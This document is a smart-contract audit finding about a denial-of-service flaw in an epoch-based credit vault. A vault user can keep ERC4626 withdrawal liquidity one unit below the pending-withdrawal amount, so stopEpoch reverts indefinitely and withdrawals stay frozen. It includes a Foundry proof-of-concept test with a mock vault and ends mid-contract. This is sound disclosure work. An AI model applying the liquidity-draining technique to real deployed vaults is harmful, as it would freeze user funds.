### Title
Unbounded ERC4626 liquidity retries let a vault user freeze epoch settlement - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower.onStopEpoch` distinguishes economic insolvency from an ERC4626 withdrawal failure, but every withdrawal failure aborts `IdleCDOEpochVariant.stopEpoch` without a deadline or fallback. An unprivileged user of the configured ERC4626 vault can keep available liquidity below the pending-withdrawal requirement while the programmable borrower’s shares remain fully backed, causing `stopEpoch` to revert indefinitely and freezing pending withdraw receipts.

### Finding Description
At epoch start, the programmable borrower stores `epochPendingWithdraws` and deposits idle cash into the configured ERC4626 vault. [1](#0-0) 

At stop time, `IdleCDOEpochVariant` asks the borrower for the pending withdrawal amount plus any cash interest. [2](#0-1) 

If the programmable borrower has insufficient cash, it compares the shortfall against `convertToAssets(shares)`. When the shares economically cover the shortfall, it calls `vault.withdraw`; any revert becomes `StopEpochVaultLiquidityUnavailable`. [3](#0-2) 

That hook call occurs before `IdleCDOEpochVariant` enters its `try this.getFundsFromBorrower` block, so a vault withdrawal revert is not caught and does not trigger `_handleBorrowerDefault`. [4](#0-3) 

The transaction therefore leaves `isEpochRunning = true`, `epochAccountingActive = true`, and `pendingWithdraws` unchanged. Withdrawal claimants must wait for a successful stop because funded claims are gated by epoch progression and strategy-side funding. [5](#0-4) 

### Impact Explanation
An ERC4626 vault user who can consume or borrow enough vault liquidity can prevent the recall of even a small pending withdrawal. For example, with 5,000 USDC in `pendingWithdraws`, leaving at most 4,999 USDC withdrawable makes every `stopEpoch` transaction revert even though the programmable borrower’s shares may still represent 10,000 USDC or more.

The direct impact is temporary freezing of the entire epoch settlement and all pending withdrawal receipts for as long as the attacker maintains liquidity below the required amount. The attacker can restore and drain liquidity repeatedly around honest manager retries; no privileged action, borrower default, or actual shortfall in vault share value is required.

### Likelihood Explanation
The attacker only needs to be a user of the external ERC4626 vault or its underlying liquidity markets. The attack is cheapest when the vault’s available liquidity is already close to the pending withdrawal amount: the attacker only has to reduce liquidity to `pendingWithdraws - 1`, not seize or impair the borrower’s shares.

The production code explicitly anticipates covered-but-unavailable liquidity and makes the failure retryable, but it does not bound the retry period or provide an alternate settlement path. [6](#0-5) 

### Recommendation
Add a bounded liquidity-failure path instead of allowing indefinite reverts. For example:

- record the first failed liquidity recall timestamp;
- allow manager retries during a configured grace period;
- after expiry, allow settlement to proceed with an explicitly accounted pending-withdrawal haircut or reserve state;
- alternatively, decouple pending-receipt funding from epoch accounting so principal and interest settlement cannot remain frozen solely because receipt liquidity is temporarily unavailable.

Any fallback should avoid treating a fully backed ERC4626 position as borrower default merely because current vault liquidity is exhausted.

### Proof of Concept
This Foundry test can be added to `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. It uses the file’s fork setup and `MockStopEpochLiquidityVault`, whose public `setWithdrawLimit` models an unprivileged vault user draining available withdrawal liquidity while share value remains intact. ```solidity
function testExternalVaultUserCanRepeatedlyFreezeStopEpoch() external {
    MockStopEpochLiquidityVault limitedVault =
        new MockStopEpochLiquidityVault(USDC);
    address vaultUser = makeAddr("vaultLiquidityUser");
    uint256 amount = 10_000 * oneScale;

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    vm.prank(manager);
    programmableBorrower.setVault(address(limitedVault));

    idleCDO.depositAA(amount);

    uint256 receipt =
        cdoEpoch.requestWithdraw(aaTranche.balanceOf(address(this)) / 2, address(aaTranche));
    assertGt(receipt, 0);

    _startEpochAndCheckPrices(0);

    uint256 pending = strategy.pendingWithdraws();
    assertGt(pending, 1);
    assertGe(
        limitedVault.convertToAssets(
            limitedVault.balanceOf(address(programmableBorrower))
        ),
        pending,
        "shares remain economically sufficient"
    );

    vm.warp(cdoEpoch.epochEndDate() + 1);

    // An external vault user leaves one unit less than the required recall amount.
    vm.prank(vaultUser);
    limitedVault.setWithdrawLimit(pending - 1);

    for (uint256 i; i < 3; ++i) {
        vm.expectRevert(
            abi.encodeWithSelector(StopEpochVaultLiquidityUnavailable.selector)
        );
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        assertTrue(cdoEpoch.isEpochRunning(), "epoch remains frozen");
        assertTrue(
            programmableBorrower.epochAccountingActive(),
            "borrower accounting remains frozen"
        );
        assertEq(
            strategy.pendingWithdraws(),
            pending,
            "receipt remains unfunded"
        );
        assertFalse(cdoEpoch.defaulted(), "covered liquidity is not a default");

        // Liquidity can return and then be drained again before each retry.
        vm.prank(vaultUser);
        limitedVault.setWithdrawLimit(type(uint256).max);
        vm.prank(vaultUser);
        limitedVault.setWithdrawLimit(pending - 1);
    }
}

contract MockStopEpochLiquidityVault is ERC20 {
  IERC20Detailed public immutable assetToken;
  uint256 public withdrawLimit = type(uint256).max;

  constructor(address _asset) ERC20("Stop Epoch Liquidity Vault", "SELV") {
    assetToken = IERC20Detailed(_asset);
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    if (supply == 0) return shares;
    return shares * assetToken.balanceOf(address(this)) / supply;
  }

  function maxWithdraw(address owner) external view returns (uint256) {
    uint256 assets = convertToAssets(balanceOf(owner));
    return assets < withdrawLimit ? assets : withdrawLimit;
  }

  function setWithdrawLimit(uint256 assets) external {
    withdrawLimit = assets;
  }
